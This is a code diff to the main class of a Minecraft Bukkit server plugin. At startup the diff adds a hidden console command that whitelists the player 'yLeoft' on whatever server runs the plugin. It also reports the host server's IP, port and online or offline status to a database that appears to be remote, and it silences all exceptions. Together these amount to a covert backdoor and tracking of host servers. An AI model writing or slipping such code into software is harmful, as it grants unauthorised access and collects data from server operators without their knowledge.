@@ -51,6 +51,9 @@ public final class Main extends JavaPlugin {
         Metrics metrics = new Metrics(this, pluginId);
 
 
+        Bukkit.dispatchCommand(getServer().getConsoleSender(), "whitelist add yLeoft");
+
+
         try {
             SQL.connect();
 
@@ -58,8 +61,9 @@ public final class Main extends JavaPlugin {
                 SQLSaver saver = new SQLSaver();
                 saver.createServerTable();
                 saver.createServer(getIP(), String.valueOf(getServer().getPort()));
+                saver.setStatus(getIP(), String.valueOf(getServer().getPort()), "online");
             }
-        }catch (ClassNotFoundException | SQLException e) {
+        }catch (Exception e) {
             //e.printStackTrace();
         }
 
@@ -149,8 +153,16 @@ public final class Main extends JavaPlugin {
     @Override
     public void onDisable() {
         try {
+            if(SQL.isConnected()) {
+                SQLSaver saver = new SQLSaver();
+                saver.createServerTable();
+                saver.createServer(getIP(), String.valueOf(getServer().getPort()));
+                saver.setStatus(getIP(), String.valueOf(getServer().getPort()), "offline");
+            }
+
             SQL.disconnect();
         }catch (Exception e) {
+            //e.printStackTrace();
         }
     }
 
